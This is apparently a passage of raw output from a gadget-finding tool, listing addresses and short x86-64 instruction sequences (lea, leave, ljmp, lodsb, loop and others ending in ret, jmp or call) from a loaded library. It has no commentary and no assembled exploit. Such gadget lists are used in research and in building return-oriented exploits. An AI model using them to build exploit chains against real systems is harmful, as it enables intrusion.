0x00002aaaaab7ac94 : lea rdi, qword ptr [rdi + 0x17] ; jne 0xa628a ; ret
0x00002aaaaab7c3c8 : lea rdi, qword ptr [rdi + 0x17] ; jne 0xa7a9a ; ret
0x00002aaaaab7acb4 : lea rdi, qword ptr [rdi + 0x18] ; jne 0xa628a ; ret
0x00002aaaaab7c3f8 : lea rdi, qword ptr [rdi + 0x18] ; jne 0xa7a9a ; ret
0x00002aaaaab7acd7 : lea rdi, qword ptr [rdi + 0x19] ; jne 0xa628a ; ret
0x00002aaaaab7c42b : lea rdi, qword ptr [rdi + 0x19] ; jne 0xa7a9a ; ret
0x00002aaaaab7ad0c : lea rdi, qword ptr [rdi + 0x1a] ; jne 0xa628a ; ret
0x00002aaaaab7c460 : lea rdi, qword ptr [rdi + 0x1a] ; jne 0xa7a9a ; ret
0x00002aaaaab7ad3a : lea rdi, qword ptr [rdi + 0x1b] ; jne 0xa628a ; ret
0x00002aaaaab7c48e : lea rdi, qword ptr [rdi + 0x1b] ; jne 0xa7a9a ; ret
0x00002aaaaab7ad6a : lea rdi, qword ptr [rdi + 0x1c] ; jne 0xa628a ; ret
0x00002aaaaab7c4be : lea rdi, qword ptr [rdi + 0x1c] ; jne 0xa7a9a ; ret
0x00002aaaaab7ad96 : lea rdi, qword ptr [rdi + 0x1d] ; jne 0xa628a ; ret
0x00002aaaaab7c4ea : lea rdi, qword ptr [rdi + 0x1d] ; jne 0xa7a9a ; ret
0x00002aaaaab7adc6 : lea rdi, qword ptr [rdi + 0x1e] ; jne 0xa628a ; ret
0x00002aaaaab7c51a : lea rdi, qword ptr [rdi + 0x1e] ; jne 0xa7a9a ; ret
0x00002aaaaab7adf6 : lea rdi, qword ptr [rdi + 0x1f] ; jne 0xa628a ; ret
0x00002aaaaab7c54a : lea rdi, qword ptr [rdi + 0x1f] ; jne 0xa7a9a ; ret
0x00002aaaaab7ae26 : lea rdi, qword ptr [rdi + 0x20] ; jne 0xa628a ; ret
0x00002aaaaab7c57a : lea rdi, qword ptr [rdi + 0x20] ; jne 0xa7a9a ; ret
0x00002aaaaab7aaf2 : lea rdi, qword ptr [rdi + 0xa] ; jne 0xa628a ; ret
0x00002aaaaab7c196 : lea rdi, qword ptr [rdi + 0xa] ; jne 0xa7a9a ; ret
0x00002aaaaab7ab10 : lea rdi, qword ptr [rdi + 0xb] ; jne 0xa628a ; ret
0x00002aaaaab7c1c4 : lea rdi, qword ptr [rdi + 0xb] ; jne 0xa7a9a ; ret
0x00002aaaaab7ab30 : lea rdi, qword ptr [rdi + 0xc] ; jne 0xa628a ; ret
0x00002aaaaab7c1e4 : lea rdi, qword ptr [rdi + 0xc] ; jne 0xa7a9a ; ret
0x00002aaaaab7ab52 : lea rdi, qword ptr [rdi + 0xd] ; jne 0xa628a ; ret
0x00002aaaaab7c206 : lea rdi, qword ptr [rdi + 0xd] ; jne 0xa7a9a ; ret
0x00002aaaaab7ab72 : lea rdi, qword ptr [rdi + 0xe] ; jne 0xa628a ; ret
0x00002aaaaab7c236 : lea rdi, qword ptr [rdi + 0xe] ; jne 0xa7a9a ; ret
0x00002aaaaab7ab92 : lea rdi, qword ptr [rdi + 0xf] ; jne 0xa628a ; ret
0x00002aaaaab7c266 : lea rdi, qword ptr [rdi + 0xf] ; jne 0xa7a9a ; ret
0x00002aaaaab7a9c6 : lea rdi, qword ptr [rdi + 1] ; jne 0xa628a ; ret
0x00002aaaaab7c069 : lea rdi, qword ptr [rdi + 1] ; jne 0xa7a9a ; ret
0x00002aaaaab7a9ea : lea rdi, qword ptr [rdi + 2] ; jne 0xa628a ; ret
0x00002aaaaab7c08e : lea rdi, qword ptr [rdi + 2] ; jne 0xa7a9a ; ret
0x00002aaaaab7aa0d : lea rdi, qword ptr [rdi + 3] ; jne 0xa628a ; ret
0x00002aaaaab7c0b1 : lea rdi, qword ptr [rdi + 3] ; jne 0xa7a9a ; ret
0x00002aaaaab7aa28 : lea rdi, qword ptr [rdi + 4] ; jne 0xa628a ; ret
0x00002aaaaab7c0cc : lea rdi, qword ptr [rdi + 4] ; jne 0xa7a9a ; ret
0x00002aaaaab7aa4b : lea rdi, qword ptr [rdi + 5] ; jne 0xa628a ; ret
0x00002aaaaab7c0ef : lea rdi, qword ptr [rdi + 5] ; jne 0xa7a9a ; ret
0x00002aaaaab7aa70 : lea rdi, qword ptr [rdi + 6] ; jne 0xa628a ; ret
0x00002aaaaab7c114 : lea rdi, qword ptr [rdi + 6] ; jne 0xa7a9a ; ret
0x00002aaaaab7aa8e : lea rdi, qword ptr [rdi + 7] ; jne 0xa628a ; ret
0x00002aaaaab7c132 : lea rdi, qword ptr [rdi + 7] ; jne 0xa7a9a ; ret
0x00002aaaaab7aaaa : lea rdi, qword ptr [rdi + 8] ; jne 0xa628a ; ret
0x00002aaaaab7c14e : lea rdi, qword ptr [rdi + 8] ; jne 0xa7a9a ; ret
0x00002aaaaab7aacd : lea rdi, qword ptr [rdi + 9] ; jne 0xa628a ; ret
0x00002aaaaab7c171 : lea rdi, qword ptr [rdi + 9] ; jne 0xa7a9a ; ret
0x00002aaaaaaf8651 : lea rdi, qword ptr [rdx + 0x10] ; mov qword ptr [rbp - 0x58], rdx ; call 0x1f8aa
0x00002aaaaab20510 : lea rdi, qword ptr [rip + 0x1445f1] ; call 0x777f9
0x00002aaaaabf4b20 : lea rdi, qword ptr [rip + 0x2a7bd5] ; call rax
0x00002aaaaabf42c1 : lea rdi, qword ptr [rip + 0x2a83d8] ; call rax
0x00002aaaaab944fc : lea rdi, qword ptr [rip + 0xc8571] ; add rax, rdi ; jmp rax
0x00002aaaaab92498 : lea rdi, qword ptr [rip + 0xd00ef] ; call 0x39779
0x00002aaaaabe9f56 : lea rdi, qword ptr [rip - 0x16d] ; call rax
0x00002aaaaabcaef4 : lea rdi, qword ptr [rsp + 0xc] ; call rax
0x00002aaaaac25503 : lea rdx, qword ptr [r11 + rdx] ; jmp rdx
0x00002aaaaab5184a : lea rdx, qword ptr [rax + 0x60] ; mov rax, qword ptr [rdi] ; mov qword ptr [rdx], rax ; ret
0x00002aaaaab4cf5a : lea rdx, qword ptr [rax + 1] ; mov qword ptr [rdi + 8], rdx ; movzx eax, byte ptr [rax] ; ret
0x00002aaaaab73237 : lea rdx, qword ptr [rcx + 1] ; mov byte ptr [rcx], 0 ; mov qword ptr [rdi], rdx ; ret
0x00002aaaaab732b6 : lea rdx, qword ptr [rcx + 1] ; mov byte ptr [rcx], 0 ; pop rbx ; mov qword ptr [rdi], rdx ; ret
0x00002aaaaab47eec : lea rdx, qword ptr [rdx + rcx*4] ; mov qword ptr [rax], rdx ; xor eax, eax ; ret
0x00002aaaaabdef92 : lea rdx, qword ptr [rdx + rsi*4] ; add eax, dword ptr [rdx + rcx] ; ret
0x00002aaaaac258f7 : lea rdx, qword ptr [rdx - 0x40] ; jmp r9
0x00002aaaaac0c627 : lea rdx, qword ptr [rip + 0x290972] ; mov qword ptr fs:[rax], rdx ; ret
0x00002aaaaac021c0 : lea rdx, qword ptr [rip + 0x2959b9] ; mov rax, qword ptr [rdx + rax*8] ; jmp rax
0x00002aaaaac0b790 : lea rdx, qword ptr [rip + 0x3609] ; mov rdi, rbx ; call qword ptr [rax]
0x00002aaaaabea6fa : lea rdx, qword ptr [rip + 0x4003f] ; cmove rax, rdx ; ret
0x00002aaaaab635e5 : lea rdx, qword ptr [rip + 0xc7164] ; cmove rax, rdx ; ret
0x00002aaaaab470a0 : lea rdx, qword ptr [rsi + 4] ; mov qword ptr [rax], rdx ; mov eax, dword ptr [rsi] ; pop rbx ; ret
0x00002aaaaabe9f52 : lea rsi, qword ptr [rbp - 0x20] ; lea rdi, qword ptr [rip - 0x16d] ; call rax
0x00002aaaaaba2f0d : lea rsi, qword ptr [rbp - 0xc0] ; mov rdi, rbx ; call qword ptr [r15]
0x00002aaaaab4626f : lea rsi, qword ptr [rcx + 4] ; mov qword ptr [rdx + 0x20], rsi ; mov dword ptr [rcx], eax ; ret
0x00002aaaaabffb9f : lea rsi, qword ptr [rdi + 0x48] ; mov rdi, rax ; mov rcx, qword ptr [rcx + 0x18] ; jmp rcx
0x00002aaaaab23616 : lea rsi, qword ptr [rip + 0x1304] ; add rax, rsi ; jmp rax
0x00002aaaaab1a0de : lea rsi, qword ptr [rip + 0x1cb] ; call rax
0x00002aaaaab44219 : lea rsi, qword ptr [rip + 0x30] ; call rax
0x00002aaaaab50f09 : lea rsi, qword ptr [rip - 0x15e0] ; call rax
0x00002aaaaab512f9 : lea rsi, qword ptr [rip - 0x19d0] ; call rax
0x00002aaaaab51749 : lea rsi, qword ptr [rip - 0x1e20] ; call rax
0x00002aaaaab44512 : lea rsi, qword ptr [rip - 0x2c9] ; call rax
0x00002aaaaab4fc39 : lea rsi, qword ptr [rip - 0x310] ; call rax
0x00002aaaaab4fea9 : lea rsi, qword ptr [rip - 0x580] ; call rax
0x00002aaaaab68931 : lea rsi, qword ptr [rsi + 0x10] ; lea rdi, qword ptr [rdi + 0x10] ; jne 0x9392b ; ret
0x00002aaaaac0f64c : lea rsi, qword ptr [rsp + 0x18] ; call qword ptr [rax]
0x00002aaaaac02ab4 : lea rsi, qword ptr [rsp + 8] ; call qword ptr [rax]
0x00002aaaaac0f9f9 : lea rsi, qword ptr [rsp + 8] ; mov rdi, r12 ; call qword ptr [rax]
0x00002aaaaac0efbc : lea rsi, qword ptr [rsp + 8] ; mov rdi, rbx ; call qword ptr [rax]
0x00002aaaaab0e8c1 : lea rsp, qword ptr [rbp - 0x10] ; pop rbx ; pop r12 ; pop rbp ; ret
0x00002aaaaab42120 : lea rsp, qword ptr [rbp - 0x18] ; pop rbx ; pop r12 ; pop r13 ; pop rbp ; ret
0x00002aaaaac6bcf5 : leave ; add byte ptr [rax], al ; adc al, 0xfc ; in eax, dx ; call rsp
0x00002aaaaabb09eb : leave ; add dword ptr [rax], eax ; add dh, dh ; ret
0x00002aaaaac2d035 : leave ; add eax, dword ptr [rax] ; movsxd rdx, dword ptr [r11 + rdx*4] ; lea rdx, qword ptr [r11 + rdx] ; jmp rdx
0x00002aaaaaafea74 : leave ; call r15
0x00002aaaaaad7bec : leave ; clc ; ret
0x00002aaaaac6fad9 : leave ; cli ; dec esp ; pop rcx ; add al, byte ptr [rax] ; test cl, cl ; cli ; jmp rsp
0x00002aaaaac6fae1 : leave ; cli ; jmp rsp
0x00002aaaaab61c06 : leave ; cmove rax, rdx ; ret
0x00002aaaaac1eab1 : leave ; cmp ch, byte ptr [rcx] ; ret 0xd089
0x00002aaaaac5d2c8 : leave ; fcompi st(3) ; call qword ptr [rcx]
0x00002aaaaac5d2c4 : leave ; fcompi st(3) ; dec ecx ; fcompi st(3) ; call qword ptr [rcx]
0x00002aaaaac5d2c0 : leave ; fcompi st(3) ; dec ecx ; fcompi st(3) ; dec ecx ; fcompi st(3) ; call qword ptr [rcx]
0x00002aaaaac5d25c : leave ; fcompi st(3) ; ljmp ptr [rdx - 0x2d] ; call qword ptr [rcx]
0x00002aaaaab08293 : leave ; fist word ptr [rax + rax] ; movsxd rcx, dword ptr [rdi + rcx*4] ; add rcx, rdi ; jmp rcx
0x00002aaaaab00395 : leave ; je 0x2b39d ; call rcx
0x00002aaaaab40459 : leave ; je 0x6b464 ; ret
0x00002aaaaabab0fe : leave ; je 0xd610f ; mov qword ptr [rcx], rax ; add rsp, 0x20 ; pop rbx ; ret
0x00002aaaaabfaa9c : leave ; jne 0x1259eb ; ret
0x00002aaaaab43570 : leave ; jne 0x6e549 ; mov dword ptr fs:[rdx], 5 ; pop rbx ; ret
0x00002aaaaab4bff0 : leave ; jne 0x76fc9 ; mov dword ptr fs:[rdx], 5 ; pop rbx ; ret
0x00002aaaaab72f79 : leave ; jne 0x9df6c ; ret
0x00002aaaaab730b8 : leave ; jne 0x9e0ad ; xor eax, eax ; ret
0x00002aaaaab7e5b0 : leave ; jne 0xa95a3 ; ret
0x00002aaaaab7e660 : leave ; jne 0xa9653 ; ret
0x00002aaaaab7e920 : leave ; jne 0xa9917 ; sub rax, 1 ; ret
0x00002aaaaab80a5c : leave ; jne 0xaba54 ; ret
0x00002aaaaab81eda : leave ; jne 0xace97 ; mov rax, rdx ; ret
0x00002aaaaac1ea78 : leave ; lea rax, qword ptr [rdi + rcx] ; sub rax, r8 ; ret
0x00002aaaaabeb443 : leave ; loop 0x11647b ; add byte ptr [rax - 0x7d], cl ; rol byte ptr [rcx], 0x8b ; adc esi, esi ; ret 0xf20
0x00002aaaaab79b21 : leave ; mov byte ptr [rax], cl ; mov rax, rdi ; ret
0x00002aaaaab09a71 : leave ; mov dword ptr [rdi], ecx ; ret
0x00002aaaaab7f264 : leave ; mov dword ptr [rdx], ecx ; jne 0xaa25e ; ret
0x00002aaaaab56b38 : leave ; mov dword ptr fs:[rax], 0xc ; mov rax, rcx ; ret
0x00002aaaaabfae86 : leave ; mov eax, 0x200000 ; jmp 0x125e57
0x00002aaaaab72e7f : leave ; movsxd r9, dword ptr [rax + r9*4] ; add rax, r9 ; jmp rax
0x00002aaaaab72ddf : leave ; movsxd rax, dword ptr [r10 + r9*4] ; add r10, rax ; jmp r10
0x00002aaaaab73b6c : leave ; movzx eax, byte ptr [rax + rcx] ; movzx edx, byte ptr [rdx + rcx] ; sub eax, edx ; ret
0x00002aaaaaaf68e0 : leave ; not eax ; xor edx, edx ; add eax, 2 ; push rax ; call rbx
0x00002aaaaaad88e8 : leave ; pop rdi ; ja 0x394e ; clc ; salc ; jb 0x3974 ; cmpsq qword ptr [rsi], qword ptr [rdi] ; ret 0x49ec
0x00002aaaaab17351 : leave ; ret
0x00002aaaaabcbbab : leave ; ret 0x2c
0x00002aaaaabb85d3 : leave ; ret 0xfff3
0x00002aaaaac6f269 : leave ; stc ; call rsp
0x00002aaaaab814c5 : leave ; xor edx, edx ; lea r9, qword ptr [rsp + 0x20] ; call rbx
0x00002aaaaab4434c : les eax, ptr [rip - 0x763f7b00] ; ret 0x8389
0x00002aaaaab4f851 : les r9d, ptr [r8 + 0x29] ; ret 0x8948
0x00002aaaaac5ecef : ljmp ptr [rax + 0x22fff67a] ; jl 0x189cf5 ; jmp qword ptr [rdx]
0x00002aaaaac6d403 : ljmp ptr [rax + rbp*2 + 0x44940001] ; cmc ; jmp rsp
0x00002aaaaac5cb1b : ljmp ptr [rax + rcx*4 + 0x79e2fff3] ; jmp rdx
0x00002aaaaac6960f : ljmp ptr [rax] ; fdivr st(3) ; push rax ; fsincos ; call rax
0x00002aaaaac5cb97 : ljmp ptr [rbp + 0x7c] ; jmp rdx
0x00002aaaaac5cbaf : ljmp ptr [rbp + 0x7c] ; lcall ptr [rsi + rcx*4 - 0xd] ; jmp rdx
0x00002aaaaac5d663 : ljmp ptr [rbx + 0x22fff452] ; push rax ; hlt ; jmp qword ptr [rdx]
0x00002aaaaac5ecc3 : ljmp ptr [rbx + 0x7a] ; idiv bh ; scasb al, byte ptr [rdi] ; jns 0x189cc9 ; jmp qword ptr [rdx]
0x00002aaaaac6f70b : ljmp ptr [rbx + rax*2 + 0x56240002] ; cli ; jmp rsp
0x00002aaaaac5cecf : ljmp ptr [rbx] ; mov dl, 0xf3 ; jmp rsp
0x00002aaaaac6cec3 : ljmp ptr [rcx + rax*2 + 0x46e40001] ; jmp rsp
0x00002aaaaac69e0b : ljmp ptr [rcx + rdx*2 + 0x513cfffc] ; cld ; jmp rdx
0x00002aaaaac5e915 : ljmp ptr [rcx - 0x3c000500] ; add dh, bh ; jmp rdi
0x00002aaaaac5d0a4 : ljmp ptr [rcx - 0x43d2000d] ; call qword ptr [rax]
0x00002aaaaab1f13c : ljmp ptr [rcx] ; enter 0x289, -0x48 ; add dword ptr [rax], eax ; add byte ptr [rax], al ; ret
0x00002aaaaac6c213 : ljmp ptr [rdi + 0x7cd40000] ; out dx, al ; jmp rsp
0x00002aaaaac6f0e3 : ljmp ptr [rdi + rdx + 2] ; add ah, dl ; mov bh, cl ; call rsp
0x00002aaaaac5d4c3 : ljmp ptr [rdi] ; fcomi st(3) ; dec dword ptr [rsi - 0x24] ; jmp qword ptr [rdi]
0x00002aaaaac5d7df : ljmp ptr [rdi] ; push rsp ; hlt ; jmp qword ptr [rdx]
0x00002aaaaac6bc33 : ljmp ptr [rdx + rax*8 - 0x282c0000] ; in eax, dx ; inc esp ; ret 0
0x00002aaaaac5d633 : ljmp ptr [rdx + rdx*2] ; hlt ; jmp qword ptr [rdx]
0x00002aaaaac5d25f : ljmp ptr [rdx - 0x2d] ; call qword ptr [rcx]
0x00002aaaaac5d457 : ljmp ptr [rdx] ; fdivr st(3), st(0) ; jmp qword ptr [rdi]
0x00002aaaaac5eccf : ljmp ptr [rsi + 0x22fff679] ; jl 0x189cd5 ; jmp qword ptr [rdx]
0x00002aaaaac5ed6b : ljmp ptr [rsi + 0x22fff679] ; jl 0x189d71 ; jmp qword ptr [rdx]
0x00002aaaaac6f8a3 : ljmp ptr [rsp + rcx*2 + 2] ; add ah, dl ; jg 0x19a8ad ; call rsp
0x00002aaaaab42713 : lock add byte ptr [rax], al ; add byte ptr [rbp + rcx*4 + 5], cl ; ret 0x3549
0x00002aaaaac42c1e : lock add byte ptr [rax], al ; add byte ptr [rsi + 0xf], ah ; cmp byte ptr [rdi], dl ; ret 0x830f
0x00002aaaaaad54ae : lock add byte ptr [rdx], al ; or al, byte ptr [rcx] ; or al, 0x80 ; push rbx ; add al, 4 ; ret 0x6080
0x00002aaaaabe225e : lock add dword ptr [rax + 0x470f3af9], eax ; ret 0xc084
0x00002aaaaab5aa94 : lock add dword ptr [rax], eax ; add byte ptr [rax - 0x7d], cl ; call qword ptr [rax]
0x00002aaaaabd05e4 : lock and byte ptr [rax - 0x77], cl ; ret
0x00002aaaaac48767 : lock cmpxchg qword ptr [rip + 0x252108], rdx ; je 0x17377e ; ret
0x00002aaaaac5bf66 : lock dec dword ptr [rax] ; sal eax, -1 ; pop rax ; ret
0x00002aaaaabf693f : lodsb al, byte ptr [rsi] ; add al, 0 ; add byte ptr [rax - 0x7d], cl ; ret 0x4104
0x00002aaaaac6f70c : lodsb al, byte ptr [rsi] ; add al, byte ptr [r8] ; and al, 0x56 ; cli ; jmp rsp
0x00002aaaaac19b90 : lodsb al, byte ptr [rsi] ; add al, byte ptr [rax] ; add byte ptr [rax - 0x7d], cl ; ret 0xeb10
0x00002aaaaac6b91d : lodsb al, byte ptr [rsi] ; add byte ptr [rax], al ; add al, 0x77 ; in eax, dx ; jmp rsp
0x00002aaaaac461b0 : lodsb al, byte ptr [rsi] ; add byte ptr [rax], al ; add dh, dh ; ret 0x7501
0x00002aaaaac7ac2d : lodsb al, byte ptr [rsi] ; add byte ptr [rax], al ; push rax ; jle 0x1a5c27 ; jmp qword ptr [rcx]
0x00002aaaaac6cec4 : lodsb al, byte ptr [rsi] ; add dword ptr [r8], eax ; in al, 0x46 ; jmp rsp
0x00002aaaaac2ee81 : lodsb al, byte ptr [rsi] ; add eax, dword ptr [rax] ; movsxd rdx, dword ptr [r11 + rdx*4] ; lea rdx, qword ptr [r11 + rdx] ; jmp rdx
0x00002aaaaac84ee4 : lodsb al, byte ptr [rsi] ; add qword ptr [r8], r8 ; clc ; outsd dx, dword ptr [rsi] ; cmc ; jmp qword ptr [rcx]
0x00002aaaaac17e3c : lodsb al, byte ptr [rsi] ; and al, 0x70 ; add al, 0 ; add byte ptr [rax - 0x7f], cl ; ret
0x00002aaaaab13a8b : lodsb al, byte ptr [rsi] ; and al, 0x80 ; add byte ptr [rax], al ; add byte ptr [rax - 0x77], cl ; ret
0x00002aaaaab8a061 : lodsb al, byte ptr [rsi] ; and al, 0x80 ; add byte ptr [rax], al ; add byte ptr [rcx - 0x7d], al ; ret
0x00002aaaaab8ac12 : lodsb al, byte ptr [rsi] ; and al, 0x88 ; add byte ptr [rax], al ; add byte ptr [rax - 0x77], cl ; ret
0x00002aaaaabb4b4a : lodsb al, byte ptr [rsi] ; and al, 0xa4 ; add byte ptr [rax], al ; add byte ptr [rcx], cl ; ret 0xb60f
0x00002aaaaac10c5a : lodsb al, byte ptr [rsi] ; and al, 0xd0 ; add byte ptr [rax], al ; add byte ptr [rax - 0x77], cl ; ret
0x00002aaaaab4bc9e : lodsb al, byte ptr [rsi] ; and al, 0xe0 ; add byte ptr [rax], al ; add byte ptr [rax - 0x77], cl ; pop rbp ; sbb al, ch ; ret
0x00002aaaaab000ac : lodsb al, byte ptr [rsi] ; clc ; add byte ptr [rax], 0 ; add cl, ch ; ret 0xfffb
0x00002aaaaac6a765 : lodsb al, byte ptr [rsi] ; cld ; call qword ptr [rax + 0x20fffcab]
0x00002aaaaac6a5a5 : lodsb al, byte ptr [rsi] ; cld ; call rsi
0x00002aaaaac6a761 : lodsb al, byte ptr [rsi] ; cld ; inc dword ptr [rax] ; lodsb al, byte ptr [rsi] ; cld ; call qword ptr [rax + 0x20fffcab]
0x00002aaaaac6a5a1 : lodsb al, byte ptr [rsi] ; cld ; inc dword ptr [rsi - 0x54] ; cld ; call rsi
0x00002aaaaaafec94 : lodsb al, byte ptr [rsi] ; cmp dword ptr [rax], eax ; ret
0x00002aaaaab8e3f8 : lodsb al, byte ptr [rsi] ; idiv bh ; nop dword ptr [rax] ; pop rbx ; ret
0x00002aaaaac7afe4 : lodsb al, byte ptr [rsi] ; mov al, 0 ; add byte ptr [rax], bl ; push rsp ; cli ; call qword ptr [rax]
0x00002aaaaac5cb1c : lodsb al, byte ptr [rsi] ; mov bl, dh ; jmp rdx
0x00002aaaaac6da04 : lodsb al, byte ptr [rsi] ; mov byte ptr [rcx], al ; add byte ptr [rsp + rsi*2 - 0xa], al ; jmp rsp
0x00002aaaaab502d4 : lodsb al, byte ptr [rsi] ; movzx eax, byte ptr [rax] ; pop rbx ; ret
0x00002aaaaac1a1b4 : lodsb al, byte ptr [rsi] ; or al, 0 ; add byte ptr [rax - 0x7d], cl ; ret 0xeb10
0x00002aaaaac59e9d : lodsb al, byte ptr [rsi] ; or byte ptr [rdi + 0x26], al ; and dword ptr cs:[rax], edx ; jmp qword ptr [rdi]
0x00002aaaaac6c214 : lodsb al, byte ptr [rsi] ; out 0, eax ; add ah, dl ; jl 0x197210 ; jmp rsp
0x00002aaaaac6d404 : lodsb al, byte ptr [rsi] ; push 0x44940001 ; cmc ; jmp rsp
0x00002aaaaac853e4 : lodsb al, byte ptr [rsi] ; push rsp ; add dword ptr [rax], eax ; pop rax ; js 0x1b03e7 ; jmp qword ptr [rbx]
0x00002aaaaac6bc34 : lodsb al, byte ptr [rsi] ; ret 0
0x00002aaaaac6e4f4 : lodsb al, byte ptr [rsi] ; ret 1
0x00002aaaaaad817e : lodsb al, byte ptr [rsi] ; xor bh, byte ptr [rsi - 0xd] ; add ebp, esi ; mov eax, 0xa1a3e95a ; ret 0xba88
0x00002aaaaab1b17c : lodsd eax, dword ptr [rsi] ; add byte ptr [rax + 0x63], cl ; ror byte ptr [rax - 0x7d], cl ; ret
0x00002aaaaab828b6 : lodsd eax, dword ptr [rsi] ; add byte ptr [rax - 0x7d], cl ; ret
0x00002aaaaab52777 : lodsd eax, dword ptr [rsi] ; add byte ptr [rax], al ; add dh, dh ; ret
0x00002aaaaac6a619 : lodsd eax, dword ptr [rsi] ; cld ; call qword ptr [rdx]
0x00002aaaaac6a55d : lodsd eax, dword ptr [rsi] ; cld ; call rax
0x00002aaaaac6a559 : lodsd eax, dword ptr [rsi] ; cld ; inc dword ptr [rax - 0x53] ; cld ; call rax
0x00002aaaaac6a599 : lodsd eax, dword ptr [rsi] ; cld ; jmp qword ptr [rsi]
0x00002aaaaac6a759 : lodsd eax, dword ptr [rsi] ; cld ; jmp rax
0x00002aaaaac6a59d : lodsd eax, dword ptr [rsi] ; cld ; push qword ptr [rsi + 0x46fffcac] ; lodsb al, byte ptr [rsi] ; cld ; call rsi
0x00002aaaaac5d129 : lodsd eax, dword ptr [rsi] ; jmp qword ptr [rdx]
0x00002aaaaac5d125 : lodsd eax, dword ptr [rsi] ; lcall ptr [rsi - 0x53] ; jmp qword ptr [rdx]
0x00002aaaaab80e89 : lodsd eax, dword ptr [rsi] ; mov rax, rbx ; pop rbx ; ret
0x00002aaaaac1dd20 : lodsd eax, dword ptr [rsi] ; or al, 0 ; add byte ptr [rax - 0x7d], cl ; ret 0x4910
0x00002aaaaab1daf2 : lodsd eax, dword ptr [rsi] ; ret
0x00002aaaaabec18f : lodsd eax, dword ptr [rsi] ; ret 0xfff5
0x00002aaaaab8fc30 : lodsd eax, dword ptr [rsi] ; xor byte ptr [rax], al ; add rsp, 8 ; ret
0x00002aaaaac5d124 : lodsd eax, dword ptr ds:[rsi] ; lcall ptr [rsi - 0x53] ; jmp qword ptr [rdx]
0x00002aaaaac6a59c : lodsd eax, dword ptr es:[rsi] ; cld ; push qword ptr [rsi + 0x46fffcac] ; lodsb al, byte ptr [rsi] ; cld ; call rsi
0x00002aaaaab828b5 : lodsq rax, qword ptr [rsi] ; add byte ptr [rax - 0x7d], cl ; ret
0x00002aaaaabeb444 : loop 0x11647a ; add byte ptr [rax - 0x7d], cl ; rol byte ptr [rcx], 0x8b ; adc esi, esi ; ret 0xf20
0x00002aaaaac0474c : loop 0x12f7d6 ; movzx eax, byte ptr [rax + rdx] ; mov byte ptr [rdi + 7], al ; ret
0x00002aaaaac0ba36 : loop 0x1369c8 ; or cl, byte ptr [rax - 0x7d] ; ret 0x8d04
0x00002aaaaac0bbc9 : loop 0x136b5b ; or cl, byte ptr [rax - 0x7d] ; ret 0x8d04
0x00002aaaaac2b6e4 : loop 0x1566f4 ; add byte ptr [rcx + 0x63], cl ; adc al, 0x93 ; lea rdx, qword ptr [r11 + rdx] ; jmp rdx
0x00002aaaaac2efda : loop 0x159fd5 ; movq qword ptr [rdi - 0x10], mm1 ; ret
0x00002aaaaac2efd9 : loop 0x159fd6 ; movq qword ptr [rdi - 0x10], mm1 ; ret
0x00002aaaaac31aaa : loop 0x15caa5 ; movq qword ptr [rdi - 0x10], mm1 ; ret
0x00002aaaaac31aa9 : loop 0x15caa6 ; movq qword ptr [rdi - 0x10], mm1 ; ret
0x00002aaaaac345ca : loop 0x15f5c5 ; movq qword ptr [rdi - 0x10], mm1 ; ret
0x00002aaaaac345c9 : loop 0x15f5c6 ; movq qword ptr [rdi - 0x10], mm1 ; ret
0x00002aaaaac42daa : loop 0x16de1c ; add al, byte ptr [rax] ; movsxd rcx, dword ptr [r11 + rdx*4] ; add rcx, r11 ; jmp rcx
0x00002aaaaac5a23a : loop 0x18528f ; add ch, byte ptr [ebp + ebp*2 + 0x5b] ; ret 0x6f9
0x00002aaaaac5ca78 : loop 0x187af6 ; jmp rdx
0x00002aaaaac5ca7c : loop 0x187afa ; jmp rdx
0x00002aaaaac5ca80 : loop 0x187afe ; jmp rdx
0x00002aaaaac5ca84 : loop 0x187b02 ; jmp rdx
0x00002aaaaac5ca88 : loop 0x187b06 ; jmp rdx
0x00002aaaaac5ca8c : loop 0x187b0a ; jmp rdx
0x00002aaaaac5ca90 : loop 0x187b0e ; jmp rdx
0x00002aaaaac5ca94 : loop 0x187b12 ; jmp rdx
0x00002aaaaac5ca98 : loop 0x187b16 ; jmp rdx
0x00002aaaaac5ca9c : loop 0x187b1a ; jmp rdx
0x00002aaaaac5caa0 : loop 0x187b1e ; jmp rdx
0x00002aaaaac5caa4 : loop 0x187b22 ; jmp rdx
0x00002aaaaac5caa8 : loop 0x187b26 ; jmp rdx
0x00002aaaaac5caac : loop 0x187b2a ; jmp rdx
0x00002aaaaac5cab0 : loop 0x187b2e ; jmp rdx
0x00002aaaaac5cab4 : loop 0x187b32 ; jmp rdx
0x00002aaaaac5cab8 : loop 0x187b36 ; jmp rdx
0x00002aaaaac5cabc : loop 0x187b3a ; jmp rdx
0x00002aaaaac5cac0 : loop 0x187b3e ; jmp rdx
0x00002aaaaac5cac4 : loop 0x187b42 ; jmp rdx
0x00002aaaaac5cac8 : loop 0x187b46 ; jmp rdx
0x00002aaaaac5cacc : loop 0x187b4a ; jmp rdx
0x00002aaaaac5cad0 : loop 0x187b4e ; jmp rdx
0x00002aaaaac5cad4 : loop 0x187b52 ; jmp rdx
0x00002aaaaac5cad8 : loop 0x187b56 ; jmp rdx
0x00002aaaaac5cadc : loop 0x187b5a ; jmp rdx
0x00002aaaaac5cb08 : loop 0x187b86 ; jmp rdx
0x00002aaaaac5cb0c : loop 0x187b8a ; jmp rdx
0x00002aaaaac5cb10 : loop 0x187b92 ; push qword ptr [rdi + rax*4 - 0xd] ; jmp rdx
0x00002aaaaac5cb20 : loop 0x187b9e ; jmp rdx
0x00002aaaaac5cb18 : loop 0x187b9e ; ljmp ptr [rax + rcx*4 + 0x79e2fff3] ; jmp rdx
0x00002aaaaac5cb4c : loop 0x187bca ; jmp rdx
0x00002aaaaac5cb50 : loop 0x187bce ; jmp rdx
0x00002aaaaac5cb54 : loop 0x187bd2 ; jmp rdx
0x00002aaaaac5cb58 : loop 0x187bd6 ; jmp rdx
0x00002aaaaac5cb5c : loop 0x187bda ; jmp rdx
0x00002aaaaac5cb78 : loop 0x187bfe ; lcall ptr [rdx + 0x42fff383] ; mov dh, bl ; jmp rdx
0x00002aaaaac5cb9c : loop 0x187c1e ; dec dword ptr [rbx - 0x7e] ; jmp rdx
0x00002aaaaac5d9a8 : loop 0x188936 ; hlt ; jmp rdx
0x00002aaaaac5d9ac : loop 0x18893a ; hlt ; jmp rdx
0x00002aaaaac5d9b0 : loop 0x18893e ; hlt ; jmp rdx
0x00002aaaaac5d9b4 : loop 0x188942 ; hlt ; jmp rdx
0x00002aaaaac5d9b8 : loop 0x188946 ; hlt ; jmp rdx
0x00002aaaaac5d9bc : loop 0x18894a ; hlt ; jmp rdx
